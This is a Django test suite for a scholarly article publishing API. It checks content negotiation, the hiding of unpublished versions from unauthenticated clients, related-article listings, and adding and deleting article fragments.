from core import middleware as mware
from datetime import timedelta
from . import base
from os.path import join
import json
from publisher import (
    ajson_ingestor,
    models,
    fragment_logic as fragments,
    utils,
    logic,
    relation_logic,
)
from django.test import Client, override_settings
from django.core.urlresolvers import reverse
from django.conf import settings
from unittest.mock import patch, Mock

SCHEMA_IDX = settings.SCHEMA_IDX  # weird, can't import directly from settings ??

#
# transition to lighter tests
#


def test_ping():
    resp = Client().get(reverse("v2:ping"))
    assert resp.status_code == 200
    assert resp.content_type == "text/plain; charset=UTF-8"
    assert resp["Cache-Control"] == "must-revalidate, no-cache, no-store, private"
    assert resp.content.decode("utf-8") == "pong"


def test_accept_types():
    "valid HTTP 'Accept' headers return expected 'Content-Type' responses"
    # (client accepts, expected accepts)
    cases = [
        # 1, typical case. accepts anything, gets latest POA spec version
        ("*/*", "application/vnd.elife.article-poa+json; version=3"),
        # 2, edge case. accepts almost anything, gets latest POA spec version
        ("application/*", "application/vnd.elife.article-poa+json; version=3"),
        # 3, typical case. requested any POA or VOR spec version
        (
            "application/vnd.elife.article-poa+json, application/vnd.elife.article-vor+json",
            "application/vnd.elife.article-poa+json; version=3",
        ),
        # 4, ideal case. any POA version, gets explicit latest version
        (
            "application/vnd.elife.article-poa+json",
            "application/vnd.elife.article-poa+json; version=3",
        ),
        # 5, deprecated case. previous POA spec version
        (
            "application/vnd.elife.article-poa+json; version=2",
            "application/vnd.elife.article-poa+json; version=2",
        ),
        # 6, ideal case. requested latest POA spec version
        (
            "application/vnd.elife.article-poa+json; version=3",
            "application/vnd.elife.article-poa+json; version=3",
        ),
        # 7, possible case. requested a set of POA spec versions. max version is used.
        (
            "application/vnd.elife.article-poa+json; version=1, application/vnd.elife.article-poa+json; version=2",
            "application/vnd.elife.article-poa+json; version=2",
        ),
        # 8, possible case. multiple different specific specs requested.
        # presence of specific vor content type shouldn't affect specific poa version returned
        (
            "application/vnd.elife.article-vor+json; version=4, application/vnd.elife.article-poa+json; version=2",
            "application/vnd.elife.article-poa+json; version=2",
        ),
    ]

    msid = 16695
    ajson_fixture_v1 = join(base.FIXTURE_DIR, "ajson", "elife-16695-v1.xml.json")
    poa_fixture = json.load(open(ajson_fixture_v1, "r"))["article"]
    mock = Mock(article_json_v1=poa_fixture, status="poa")

    with patch("publisher.logic.most_recent_article_version", return_value=mock):
        for i, (client_accepts, expected_accepted) in enumerate(cases):
            url = reverse("v2:article", kwargs={"msid": msid})
            resp = Client().get(url, HTTP_ACCEPT=client_accepts)
            msg = "failed case %s %r, got: %s" % (
                i + 1,
                client_accepts,
                resp.status_code,
            )
            assert 200 == resp.status_code, msg

            msg = "failed case %s %r, got: %s" % (
                i + 1,
                client_accepts,
                resp.content_type,
            )
            assert expected_accepted == resp.content_type, msg


def test_unacceptable_types():
    """lax responds with HTTP 406 when a content-type or a specific version 
    of a content-type cannot be reconciled against actual content types and versions"""
    cases = [
        # 1, obsolete (poa v1)
        "application/vnd.elife.article-poa+json; version=1",
        # 2, cannot fulfill request (fixture is a poa, not a specific obsolete vor)
        "application/vnd.elife.article-vor+json; version=1",
        # 3, cannot fulfill request (fixture is a poa, not a specific valid vor)
        "application/vnd.elife.article-vor+json; version=4",
        # 4, cannot fulfill request (fixture is a poa, not a general vor)
        "application/vnd.elife.article-vor+json",
        # 5, cannot fulfill request (fixture is still a poa)
        "application/vnd.elife.article-vor+json; version=1, application/vnd.elife.article-vor+json; version=2",
        # 6, fictitious content versions (for now)
        "application/vnd.elife.article-vor+json; version=8, application/vnd.elife.article-vor+json; version=9",
        # 7. fictitious content versions (for now)
        "application/vnd.elife.article-poa+json; version=9",
        # 8. unrecognised content types
        "application/foo.bar.baz; version=1",
    ]

    msid = 16695
    ajson_fixture_v1 = join(base.FIXTURE_DIR, "ajson", "elife-16695-v1.xml.json")
    poa_fixture = json.load(open(ajson_fixture_v1, "r"))["article"]
    mock = Mock(article_json_v1=poa_fixture, status="poa")

    with patch("publisher.logic.most_recent_article_version", return_value=mock):
        for i, client_accepts in enumerate(cases):
            url = reverse("v2:article", kwargs={"msid": msid})
            resp = Client().get(url, HTTP_ACCEPT=client_accepts)
            msg = "failed case %s, got: %s" % (i + 1, resp.status_code,)
            assert 406 == resp.status_code, msg


def test_structured_abstract_not_downgraded_vor():
    "a vor with a structured abstract cannot be downgraded to vor v3"
    msid = 31549  # vor spec version 4, our first
    fixture_path = join(
        base.FIXTURE_DIR, "structured-abstracts", "elife-31549-v1.xml.json"
    )
    fixture = json.load(open(fixture_path, "r"))["article"]
    mock = Mock(article_json_v1=fixture, status="vor")
    vor_v3_ctype = "application/vnd.elife.article-vor+json; version=3"

    with patch("publisher.logic.most_recent_article_version", return_value=mock):
        url = reverse("v2:article", kwargs={"msid": msid})
        resp = Client().get(url, HTTP_ACCEPT=vor_v3_ctype)
        assert 406 == resp.status_code


def test_structured_abstract_not_downgraded_poa():
    "a poa with a structured abstract cannot be downgraded to poa v2"
    msid = 31549  # vor spec version 4, our first
    fixture_path = join(
        base.FIXTURE_DIR, "structured-abstracts", "elife-31549-v1.xml.json"
    )
    fixture = json.load(open(fixture_path, "r"))["article"]
    fixture["status"] = "poa"
    mock = Mock(article_json_v1=fixture, status="poa")
    poa_v2_ctype = "application/vnd.elife.article-poa+json; version=2"

    with patch("publisher.logic.most_recent_article_version", return_value=mock):
        url = reverse("v2:article", kwargs={"msid": msid})
        resp = Client().get(url, HTTP_ACCEPT=poa_v2_ctype)
        assert 406 == resp.status_code


def test_deprecated_header_present():
    "requests for deprecated content received a deprecated header in the response"
    msid = 16695
    fixture_path = join(base.FIXTURE_DIR, "ajson", "elife-16695-v1.xml.json")
    fixture = json.load(open(fixture_path, "r"))["article"]
    mock = Mock(article_json_v1=fixture, status="poa")
    deprecated_ctype = "application/vnd.elife.article-poa+json; version=2"

    with patch("publisher.logic.most_recent_article_version", return_value=mock):
        url = reverse("v2:article", kwargs={"msid": msid})
        resp = Client().get(url, HTTP_ACCEPT=deprecated_ctype)
        assert 200 == resp.status_code
        msg = "Deprecation: Support for this Content-Type version will be removed"
        assert msg == resp["warning"]


#
#
#


class V2ContentTypes(base.BaseCase):
    def setUp(self):
        self.c = Client()
        self.msid = 16695
        # poa
        self.ajson_fixture_v1 = join(
            self.fixture_dir, "ajson", "elife-16695-v1.xml.json"
        )
        # vor
        self.ajson_fixture_v2 = join(
            self.fixture_dir, "ajson", "elife-16695-v2.xml.json"
        )

    def test_current_response_types(self):
        "lax responds with the correct content-type and latest version for all of it's supported content"
        # ingest the poa and vor versions
        for path in [self.ajson_fixture_v1, self.ajson_fixture_v2]:
            ajson_ingestor.ingest_publish(json.load(open(path, "r")))

        # TODO: more cases of fixed content versions :(
        # map the known types to expected types
        art_list_type = "application/vnd.elife.article-list+json; version=1"
        art_poa_type = "application/vnd.elife.article-poa+json; version=3"
        art_vor_type = "application/vnd.elife.article-vor+json; version=4"
        art_history_type = "application/vnd.elife.article-history+json; version=1"
        art_related_type = "application/vnd.elife.article-related+json; version=1"

        case_list = {
            reverse("v2:article-list"): art_list_type,
            reverse(
                "v2:article-version-list", kwargs={"msid": self.msid}
            ): art_history_type,
            reverse("v2:article", kwargs={"msid": self.msid}): art_vor_type,
            # 'version' here is the article version, not api or mime version
            # v1 of this article fixture is a POA
            reverse(
                "v2:article-version", kwargs={"msid": self.msid, "version": 1}
            ): art_poa_type,
            # v2 of this fixture is a VOR
            reverse(
                "v2:article-version", kwargs={"msid": self.msid, "version": 2}
            ): art_vor_type,
            reverse(
                "v2:article-relations", kwargs={"msid": self.msid}
            ): art_related_type,
        }

        # test
        for url, expected_type in case_list.items():
            resp = self.c.get(url)
            expected_pair = (200, expected_type)
            actual_pair = (resp.status_code, resp.content_type)
            self.assertEqual(expected_pair, actual_pair)

    def test_error_response_type(self):
        "all error responses have the same structure"
        cases = [
            # (request url, params, args, status code)
            (reverse("v2:article-list"), {"per-page": -1}, {}, 400),
            (reverse("v2:article", kwargs={"msid": 9999999}), {}, {}, 404),
            (reverse("v2:article-list"), {}, {"HTTP_ACCEPT": "application/foo"}, 406),
        ]
        for url, params, args, expected_status_code in cases:
            resp = self.c.get(url, params, **args)
            self.assertEqual(expected_status_code, resp.status_code)
            body = resp.json()
            self.assertTrue("title" in body)  # 'detail' is optional


class V2Content(base.BaseCase):
    def setUp(self):
        ingest_these = [
            # "elife-01968-v1.xml.json",
            "elife-20125-v1.xml.json",  # poa
            "elife-20125-v2.xml.json",  # poa
            "elife-20125-v3.xml.json",  # vor, related to 21162
            # "elife-21162-v1.xml.json", # vor, related to 20125
            # "elife-16695-v1.xml.json",
            # "elife-16695-v2.xml.json",
            # "elife-16695-v3.xml.json", # vor
            "elife-20105-v1.xml.json",  # poa
            "elife-20105-v2.xml.json",  # poa
            "elife-20105-v3.xml.json",  # poa, UNPUBLISHED
        ]
        ajson_dir = join(self.fixture_dir, "ajson")
        for ingestable in ingest_these:
            data = self.load_ajson(join(ajson_dir, ingestable))
            # remove these values here so they don't interfere in creation
            utils.delall(
                data, ["-related-articles-internal", "-related-articles-external"]
            )
            ajson_ingestor.ingest_publish(data)

        self.msid1 = 20125
        self.msid2 = 20105

        # 2 article, 6 versions, 5 published, 1 unpublished
        self.unpublish(self.msid2, version=3)

        # an unauthenticated client
        self.c = Client()
        # an authenticated client
        self.ac = Client(**{mware.CGROUPS: "view-unpublished-content"})

    def test_head_request(self):
        cases = [
            reverse("v2:article", kwargs={"msid": self.msid1}),
            reverse("v2:article-list"),
            reverse("v2:ping"),
            reverse("v2:article-version", kwargs={"msid": self.msid1, "version": 1}),
            reverse("v2:article-version-list", kwargs={"msid": self.msid1}),
            reverse("v2:article-relations", kwargs={"msid": self.msid1}),
        ]
        for url in cases:
            resp = self.c.head(url)
            expected_status_code = 200
            self.assertEqual(expected_status_code, resp.status_code)

    def test_article_list(self):
        "a list of published articles are returned to an unauthenticated response"
        resp = self.c.get(reverse("v2:article-list"))
        self.assertEqual(resp.status_code, 200)
        self.assertEqual(
            resp.content_type, "application/vnd.elife.article-list+json; version=1"
        )
        data = utils.json_loads(resp.content)

        # valid data
        utils.validate(data, SCHEMA_IDX["list"])

        # correct data
        self.assertEqual(data["total"], 2)  # two results, [msid1, msid2]

        # FIXME: non-deterministic insertion order. sometimes you get av2, av1 ...
        av1, av2 = data["items"]
        # print(data['items'])

        self.assertEqual(av1["version"], 2)
        self.assertEqual(av2["version"], 3)

    def test_article_list_including_unpublished(self):
        "a list of published and unpublished articles are returned to an authorized response"
        resp = self.ac.get(reverse("v2:article-list"))
        self.assertEqual(resp.status_code, 200)
        self.assertEqual(
            resp.content_type, "application/vnd.elife.article-list+json; version=1"
        )
        self.assertEqual(resp[settings.KONG_AUTH_HEADER], "True")
        data = utils.json_loads(resp.content)
        idx = {int(item["id"]): item for item in data["items"]}

        # valid data
        utils.validate(data, SCHEMA_IDX["list"])

        # correct data
        self.assertEqual(data["total"], 2)  # two results, [msid1, msid2]
        self.assertEqual(
            idx[self.msid1]["version"], 3
        )  # we get the unpublished v3 back
        self.assertEqual(idx[self.msid2]["version"], 3)

    def test_article_poa(self):
        "the latest version of the requested article is returned"
        resp = self.c.get(reverse("v2:article", kwargs={"msid": self.msid2}))
        self.assertEqual(resp.status_code, 200)
        self.assertEqual(
            resp.content_type, "application/vnd.elife.article-poa+json; version=3"
        )
        data = utils.json_loads(resp.content)

        # valid data
        utils.validate(data, SCHEMA_IDX["poa"])

        # correct data
        self.assertEqual(data["version"], 2)  # v3 is unpublished

    def test_article_poa_unpublished(self):
        "the latest version of the requested article is returned"
        resp = self.ac.get(reverse("v2:article", kwargs={"msid": self.msid2}))
        self.assertEqual(resp.status_code, 200)
        self.assertEqual(
            resp.content_type, "application/vnd.elife.article-poa+json; version=3"
        )
        data = utils.json_loads(resp.content)

        # valid data
        utils.validate(data, SCHEMA_IDX["poa"])

        # correct data
        self.assertEqual(data["version"], 3)

    def test_article_vor(self):
        "the latest version of the requested article is returned"
        resp = self.c.get(reverse("v2:article", kwargs={"msid": self.msid1}))
        self.assertEqual(resp.status_code, 200)
        self.assertEqual(
            resp.content_type, "application/vnd.elife.article-vor+json; version=4"
        )

        data = utils.json_loads(resp.content)

        # valid data
        utils.validate(data, SCHEMA_IDX["vor"])

        # correct data
        self.assertEqual(data["version"], 3)

    def test_article_unpublished_version_not_returned(self):
        "unpublished article versions are not returned"
        self.unpublish(self.msid2, version=3)
        self.assertEqual(
            models.ArticleVersion.objects.filter(article__manuscript_id=self.msid2)
            .exclude(datetime_published=None)
            .count(),
            2,
        )
        resp = self.c.get(reverse("v2:article", kwargs={"msid": self.msid2}))
        self.assertEqual(resp.status_code, 200)
        data = utils.json_loads(resp.content)

        # valid data
        utils.validate(data, SCHEMA_IDX["poa"])

        # correct data
        self.assertEqual(data["version"], 2)  # third version was unpublished

        # list of versions
        version_list = self.c.get(
            reverse("v2:article-version-list", kwargs={"msid": self.msid2})
        )
        self.assertEqual(version_list.status_code, 200)
        version_list_data = utils.json_loads(version_list.content)
        self.assertEqual(len(version_list_data["versions"]), 2)

        # directly trying to access the unpublished version
        unpublished_version = self.c.get(
            reverse("v2:article-version", kwargs={"msid": self.msid2, "version": 3})
        )
        self.assertEqual(unpublished_version.status_code, 404)

    def test_article_does_not_exist(self):
        fake_msid = 123
        resp = self.c.get(reverse("v2:article", kwargs={"msid": fake_msid}))
        self.assertEqual(resp.status_code, 404)

    def test_article_versions_list(self):
        "valid json content is returned"
        resp = self.c.get(
            reverse("v2:article-version-list", kwargs={"msid": self.msid2})
        )
        self.assertEqual(resp.status_code, 200)

        self.assertEqual(
            resp.content_type, "application/vnd.elife.article-history+json; version=1"
        )
        data = utils.json_loads(resp.content)

        # valid data
        utils.validate(data, SCHEMA_IDX["history"])

        # correct data
        self.assertEqual(
            len(data["versions"]), 2
        )  # this article only has two *published*

        # correct order
        expected = [1, 2]
        given = [data["versions"][i]["version"] for i in range(0, 2)]
        self.assertEqual(given, expected)

    def test_unpublished_article_versions_list(self):
        "valid json content is returned"

        # 2016-07-21: lax used to depend on certain values from ejp, but these are now pulled from the xml.
        # we need some data that can only come from ejp for this
        # import ejp_ingestor
        # ejp_data = join(self.fixture_dir, 'dummy-ejp-for-v2-api-fixtures.json')
        # ejp_ingestor.import_article_list_from_json_path(logic.journal(), ejp_data, create=False, update=True)

        resp = self.ac.get(
            reverse("v2:article-version-list", kwargs={"msid": self.msid2})
        )
        self.assertEqual(resp.status_code, 200)

        self.assertEqual(
            resp.content_type, "application/vnd.elife.article-history+json; version=1"
        )
        data = utils.json_loads(resp.content)

        # valid data
        utils.validate(data, SCHEMA_IDX["history"])

        # correct data
        self.assertEqual(
            len(data["versions"]), 3
        )  # this article has two *published*, one *unpublished*

        # correct order
        expected = [1, 2, 3]
        given = [data["versions"][i]["version"] for i in range(0, 3)]
        self.assertEqual(given, expected)

    def test_article_versions_list_does_not_exist(self):
        "request the list of versions for an article that doesn't exist returns a 404"
        models.Article.objects.all().delete()
        self.assertEqual(models.Article.objects.count(), 0)
        resp = self.c.get(
            reverse("v2:article-version-list", kwargs={"msid": self.msid2})
        )
        self.assertEqual(resp.status_code, 404)

    @override_settings(VALIDATE_FAILS_FORCE=False)
    def test_article_versions_list_placeholder(self):
        "invalid article-json causes a placeholder to be served instead"
        invalid_ajson = json.load(
            open(join(self.fixture_dir, "ajson", "elife-20125-v4.xml.json"), "r")
        )
        invalid_ajson["article"]["title"] = ""
        av = ajson_ingestor.ingest_publish(invalid_ajson, force=True)
        self.freshen(av)

        # we now have a published article in lax with invalid article-json

        resp = self.c.get(
            reverse("v2:article-version-list", kwargs={"msid": self.msid1})
        )
        data = utils.json_loads(resp.content)

        # the invalid-but-published culprit
        v4 = data["versions"][-1]

        expected_struct = utils.json_loads(
            utils.json_dumps(
                {
                    "-invalid": True,
                    "id": av.article.manuscript_id,
                    "status": av.status,
                    "published": av.article.datetime_published,
                    "version": 4,
                    "versionDate": av.datetime_published,
                }
            )
        )
        self.assertEqual(expected_struct, v4)

    def test_article_version(self):
        versions = [1, 2, 3]
        for ver in versions:
            resp = self.ac.get(
                reverse(
                    "v2:article-version", kwargs={"msid": self.msid2, "version": ver}
                )
            )
            self.assertEqual(resp.status_code, 200)

    def test_article_version_art_does_not_exist(self):
        "returns 404 when an article doesn't exist for the article-version endpoint"
        models.Article.objects.all().delete()
        self.assertEqual(models.Article.objects.count(), 0)
        resp = self.c.get(
            reverse("v2:article-version", kwargs={"msid": "123", "version": 1})
        )
        self.assertEqual(resp.status_code, 404)

    def test_article_version_artver_does_not_exist(self):
        "returns 404 when a version of the article doesn't exist for the article-version endpoint"
        resp = self.c.get(
            reverse("v2:article-version", kwargs={"msid": self.msid2, "version": 9})
        )
        self.assertEqual(resp.status_code, 404)

    def test_related_articles(self):
        "related articles endpoint exists and returns a 200 response for published article"
        resp = self.c.get(reverse("v2:article-relations", kwargs={"msid": self.msid1}))
        self.assertEqual(resp.status_code, 200)
        self.assertEqual(utils.json_loads(resp.content), [])

    def test_related_articles_of_an_article_that_does_not_exist(self):
        "related articles endpoint returns a 404 response for missing article"
        resp = self.c.get(reverse("v2:article-relations", kwargs={"msid": 42}))
        self.assertEqual(resp.status_code, 404)

    def test_related_articles_on_unpublished_article(self):
        """related articles endpoint returns a 200 response to an authenticated request for
        an unpublished article and a 404 to an unauthenticated request"""
        self.unpublish(self.msid2, version=3)
        self.unpublish(self.msid2, version=2)
        self.unpublish(self.msid2, version=1)

        # auth
        resp = self.ac.get(reverse("v2:article-relations", kwargs={"msid": self.msid2}))
        self.assertEqual(resp.status_code, 200)

        # no auth
        resp = self.c.get(reverse("v2:article-relations", kwargs={"msid": self.msid2}))
        self.assertEqual(resp.status_code, 404)

    def test_related_articles_expected_data(self):
        # create a relationship between 1 and 2
        relation_logic._relate_using_msids([(self.msid1, [self.msid2])])

        # no auth
        expected = [
            logic.article_snippet_json(logic.most_recent_article_version(self.msid2))
        ]
        resp = self.c.get(reverse("v2:article-relations", kwargs={"msid": self.msid1}))
        data = utils.json_loads(resp.content)
        self.assertEqual(expected, data)

        # auth
        expected = [
            logic.article_snippet_json(
                logic.most_recent_article_version(self.msid2, only_published=False)
            )
        ]
        resp = self.ac.get(reverse("v2:article-relations", kwargs={"msid": self.msid1}))
        data = utils.json_loads(resp.content)
        self.assertEqual(expected, data)

    def test_related_article_with_unpublished_article(self):
        # create a relationship between 1 and 2
        relation_logic._relate_using_msids([(self.msid1, [self.msid2])])
        # unpublish v2
        self.unpublish(self.msid2)

        # no auth
        expected = []  # empty response
        resp = self.c.get(reverse("v2:article-relations", kwargs={"msid": self.msid1}))
        data = utils.json_loads(resp.content)
        self.assertEqual(data, expected)

        # auth
        expected = [
            logic.article_snippet_json(
                logic.most_recent_article_version(self.msid2, only_published=False)
            )
        ]
        resp = self.ac.get(reverse("v2:article-relations", kwargs={"msid": self.msid1}))
        data = utils.json_loads(resp.content)
        self.assertEqual(data, expected)

    def test_related_article_with_stub_article(self):
        # create a relationship between 1 and 2
        relation_logic._relate_using_msids([(self.msid1, [self.msid2])])
        # delete all ArticleVersions leaving just an Article (stub)
        models.ArticleVersion.objects.filter(article__manuscript_id=self.msid2).delete()

        # no auth
        expected = []  # empty response
        resp = self.c.get(reverse("v2:article-relations", kwargs={"msid": self.msid1}))
        data = utils.json_loads(resp.content)
        self.assertEqual(data, expected)

        # auth
        expected = []  # also an empty response (nothing to serve up)
        resp = self.ac.get(reverse("v2:article-relations", kwargs={"msid": self.msid1}))
        data = utils.json_loads(resp.content)
        self.assertEqual(data, expected)


class AddFragment(base.BaseCase):
    def setUp(self):
        path = join(self.fixture_dir, "ajson", "elife-20105-v1.xml.json")
        self.ajson = json.load(open(path, "r"))
        ajson_ingestor.ingest_publish(self.ajson)

        self.msid = 20105
        self.version = 1

        self.av = models.ArticleVersion.objects.filter(
            article__manuscript_id=self.msid
        )[0]
        self.assertTrue(self.av.published())
        self.assertTrue(fragments.merge_if_valid(self.av))

        self.c = Client()
        self.ac = Client(**{mware.CGROUPS: "view-unpublished-content"})

    def test_add_fragment(self):
        "a POST request can be sent that adds an article fragment"
        key = "test-frag"
        url = reverse(
            "v2:article-fragment", kwargs={"msid": self.msid, "fragment_id": key}
        )
        fragment = {"title": "Electrostatic selection"}
        q = models.ArticleFragment.objects.filter(article__manuscript_id=self.msid)

        # POST fragment into lax
        self.assertEqual(q.count(), 1)  # 'xml->json'
        resp = self.ac.post(url, json.dumps(fragment), content_type="application/json")
        self.assertEqual(resp.status_code, 200)

        # fragment has been added
        frag = models.ArticleFragment.objects.get(type=key)
        self.assertEqual(frag.fragment, fragment)

        # fragment is served into the article
        article_url = reverse("v2:article-version-list", kwargs={"msid": self.msid})
        resp = self.c.get(article_url)
        data = utils.json_loads(resp.content)
        self.assertEqual(data["versions"][0]["title"], fragment["title"])

    def test_fragment_needs_authentication(self):
        "only admin users can modify content"
        key = "test-frag"
        url = reverse(
            "v2:article-fragment", kwargs={"msid": self.msid, "fragment_id": key}
        )
        fragment = {"title": "Electrostatic selection"}

        resp = self.c.post(url, json.dumps(fragment), content_type="application/json")
        self.assertEqual(resp.status_code, 403)

    def test_add_fragment_multiple_versions(self):
        path = join(self.fixture_dir, "ajson", "elife-20105-v2.xml.json")
        ajson_ingestor.ingest_publish(json.load(open(path, "r")))

        key = "test-frag"
        url = reverse(
            "v2:article-fragment", kwargs={"msid": self.msid, "fragment_id": key}
        )
        fragment = {"title": "Electrostatic selection"}

        resp = self.ac.post(url, json.dumps(fragment), content_type="application/json")
        self.assertEqual(resp.status_code, 200)

        # fragment is served into all article versions
        article_url = reverse("v2:article-version-list", kwargs={"msid": self.msid})
        resp = self.c.get(article_url)
        data = utils.json_loads(resp.content)
        self.assertEquals(len(data["versions"]), 2)
        self.assertEqual(data["versions"][0]["title"], fragment["title"])
        self.assertEqual(data["versions"][1]["title"], fragment["title"])

    def test_add_fragment_twice(self):
        key = "test-frag"
        url = reverse(
            "v2:article-fragment", kwargs={"msid": self.msid, "fragment_id": key}
        )

        # POST fragment into lax
        fragment1 = {"title": "pants-party"}
        resp = self.ac.post(url, json.dumps(fragment1), content_type="application/json")
        self.assertEqual(resp.status_code, 200)

        # fragment has been added
        frag = models.ArticleFragment.objects.get(type=key)
        self.assertEqual(frag.fragment, fragment1)

        # do it again
        fragment2 = {"title": "party-pants"}
        resp = self.ac.post(url, json.dumps(fragment2), content_type="application/json")
        self.assertEqual(resp.status_code, 200)

        # fragment has been added
        frag = models.ArticleFragment.objects.get(type=key)
        self.assertEqual(frag.fragment, fragment2)

    def test_add_fragment_for_non_article(self):
        # POST fragment into lax
        url = reverse(
            "v2:article-fragment", kwargs={"msid": 99999, "fragment_id": "test-frag"}
        )
        resp = self.ac.post(url, json.dumps({}), content_type="application/json")
        self.assertEqual(resp.status_code, 404)
        self.assertEqual(models.ArticleFragment.objects.count(), 1)  # 'xml->json'

    def test_add_fragment_for_unpublished_article(self):
        "article hasn't been published yet but we want to contribute content"
        # unpublish our article
        self.unpublish(self.msid, self.version)
        av = self.freshen(self.av)
        self.assertFalse(av.published())

        # post to unpublished article
        url = reverse(
            "v2:article-fragment",
            kwargs={"msid": self.msid, "fragment_id": "test-frag"},
        )
        fragment = {"more-article-content": "pants"}
        resp = self.ac.post(url, json.dumps(fragment), content_type="application/json")
        self.assertEqual(resp.status_code, 200)

    def test_add_fragment_fails_unknown_content_type(self):
        url = reverse(
            "v2:article-fragment",
            kwargs={"msid": self.msid, "fragment_id": "test-frag"},
        )
        resp = self.ac.post(
            url, json.dumps({}), content_type="application/PAAAAAAANTSss"
        )
        self.assertEqual(resp.status_code, 415)  # unsupported media type

    def test_add_bad_fragment(self):
        """request with fragment that would cause otherwise validating article json
        to become invalid is refused"""
        self.assertEqual(models.ArticleFragment.objects.count(), 1)  # xml->json
        fragment = {"doi": "this is no doi!"}
        url = reverse(
            "v2:article-fragment",
            kwargs={"msid": self.msid, "fragment_id": "test-frag"},
        )
        resp = self.ac.post(url, json.dumps(fragment), content_type="application/json")
        self.assertEqual(models.ArticleFragment.objects.count(), 1)  # 'xml->json'
        self.assertEqual(resp.status_code, 400)  # bad client request

    def test_add_invalid_fragment(self):
        "request with fragment that would fail the ArticleFragment schema is refused"
        self.assertEqual(models.ArticleFragment.objects.count(), 1)  # xml->json
        fragment = {}  # empty
        url = reverse(
            "v2:article-fragment",
            kwargs={"msid": self.msid, "fragment_id": "test-frag"},
        )
        resp = self.ac.post(url, json.dumps(fragment), content_type="application/json")
        self.assertEqual(models.ArticleFragment.objects.count(), 1)  # 'xml->json'
        self.assertEqual(resp.status_code, 400)  # bad client request

    def test_add_fragment_causes_no_change(self):
        "request with fragment that would cause no change in the merged article json is accepted."
        # behind the scenes the hash check is disabled so the Identical exception is not raised
        fragment = {"title": self.ajson["article"]["title"]}
        url = reverse(
            "v2:article-fragment",
            kwargs={"msid": self.msid, "fragment_id": "test-frag"},
        )
        resp = self.ac.post(url, json.dumps(fragment), content_type="application/json")
        self.assertEqual(resp.status_code, 200)
        self.assertEqual(
            models.ArticleFragment.objects.count(), 2
        )  # 'xml->json', 'test-frag'


class DeleteFragment(base.BaseCase):
    def setUp(self):
        # unauthenticated
        self.c = Client()
        # authenticated
        self.ac = Client(**{mware.CGROUPS: "view-unpublished-content"})

        self.msid = 16695
        self.ajson_fixture_v1 = join(
            self.fixture_dir, "ajson", "elife-16695-v1.xml.json"
        )  # poa
        self.av = ajson_ingestor.ingest_publish(
            json.load(open(self.ajson_fixture_v1, "r"))
        )

        self.key = "test-frag"
        fragment = {"title": "Electrostatic selection"}
        fragments.add(
            self.av.article, self.key, fragment
        )  # add it to the *article* not the article *version*

    def tearDown(self):
        pass

    def test_delete_fragment(self):
        expected_fragments = 2  # XML2JSON + 'test-frag'
        self.assertEqual(models.ArticleFragment.objects.count(), expected_fragments)
        url = reverse(
            "v2:article-fragment", kwargs={"msid": self.msid, "fragment_id": self.key}
        )
        resp = self.ac.delete(url)
        self.assertEqual(200, resp.status_code)
        self.assertEqual(models.ArticleFragment.objects.count(), expected_fragments - 1)

    def test_delete_fragment_not_authenticated(self):
        expected_fragments = 2  # XML2JSON + 'test-frag'
        self.assertEqual(models.ArticleFragment.objects.count(), expected_fragments)
        url = reverse(
            "v2:article-fragment", kwargs={"msid": self.msid, "fragment_id": self.key}
        )
        resp = self.c.delete(url)  # .c vs .ac
        self.assertEqual(403, resp.status_code)
        self.assertEqual(models.ArticleFragment.objects.count(), expected_fragments)

    def test_delete_fragment_doesnt_exist(self):
        expected_fragments = 2  # XML2JSON + 'test-frag'
        self.assertEqual(models.ArticleFragment.objects.count(), expected_fragments)
        url = reverse(
            "v2:article-fragment",
            kwargs={"msid": self.msid, "fragment_id": "pants-party"},
        )
        resp = self.ac.delete(url)
        self.assertEqual(resp.status_code, 404)
        self.assertEqual(models.ArticleFragment.objects.count(), expected_fragments)

    def test_delete_protected_fragment(self):
        expected_fragments = 2  # XML2JSON + 'test-frag'
        self.assertEqual(models.ArticleFragment.objects.count(), expected_fragments)
        url = reverse(
            "v2:article-fragment",
            kwargs={"msid": self.msid, "fragment_id": models.XML2JSON},
        )
        resp = self.ac.delete(url)
        self.assertEqual(resp.status_code, 400)  # client error, bad request
        self.assertEqual(models.ArticleFragment.objects.count(), expected_fragments)

    def test_delete_fragment_fails_if_result_is_invalid(self):
        "if the result of deleting a fragment is invalid article-json, the fragment will not be deleted"
        # modify the XML2JSON fragment so 'title' is None (invalid)
        # the test fragment {'title': 'whatever'} makes it valid
        # deleting the test fragment should fail
        fobj = models.ArticleFragment.objects.get(type=models.XML2JSON)
        fobj.fragment["title"] = None
        fobj.save()
        self.assertTrue(fragments.merge_if_valid(self.av))  # returns None if invalid
        url = reverse(
            "v2:article-fragment", kwargs={"msid": self.msid, "fragment_id": self.key}
        )
        resp = self.ac.delete(url)
        self.assertEqual(resp.status_code, 400)
        expected_fragments = 2  # XML2JSON + 'test-frag'
        self.assertEqual(models.ArticleFragment.objects.count(), expected_fragments)


class FragmentEvents(base.TransactionBaseCase):
    def setUp(self):
        path = join(self.fixture_dir, "ajson", "elife-20105-v1.xml.json")
        ajson_ingestor.ingest_publish(json.load(open(path, "r")))

        self.msid = 20105
        self.version = 1

        self.av = models.ArticleVersion.objects.filter(
            article__manuscript_id=self.msid
        )[0]
        self.assertTrue(self.av.published())
        self.assertTrue(fragments.merge_if_valid(self.av))

        self.c = Client()
        self.ac = Client(**{mware.CGROUPS: "view-unpublished-content"})

    def tearDown(self):
        pass

    @override_settings(DEBUG=False)  # get past the early return in aws_events
    def test_add_fragment_sends_aws_event(self):
        "successfully adding a fragment sends an aws event"
        mock = Mock()
        with patch("publisher.aws_events.event_bus_conn", return_value=mock):
            url = reverse(
                "v2:article-fragment",
                kwargs={"msid": self.msid, "fragment_id": "test-frag"},
            )

            fragment = {"title": "Electrostatic selection"}
            resp = self.ac.post(
                url, json.dumps(fragment), content_type="application/json"
            )
            self.assertEqual(resp.status_code, 200)  # success

            # https://docs.djangoproject.com/en/1.10/topics/db/transactions/#use-in-tests
            expected_event = json.dumps({"type": "article", "id": self.msid})
            mock.publish.assert_called_once_with(Message=expected_event)

    @override_settings(DEBUG=False)  # get past the early return in aws_events
    def test_delete_fragment_sends_aws_event(self):
        "sucessfully deleting a fragment sends an aws event"
        self.key = "test-frag"
        fragment = {"title": "Electrostatic selection"}
        fragments.add(
            self.av.article, self.key, fragment
        )  # add it to the *article* not the article *version*

        mock = Mock()
        with patch("publisher.aws_events.event_bus_conn", return_value=mock):
            url = reverse(
                "v2:article-fragment",
                kwargs={"msid": self.msid, "fragment_id": self.key},
            )

            resp = self.ac.delete(url, json.dumps(fragment))
            self.assertEqual(resp.status_code, 200)  # successfully deleted

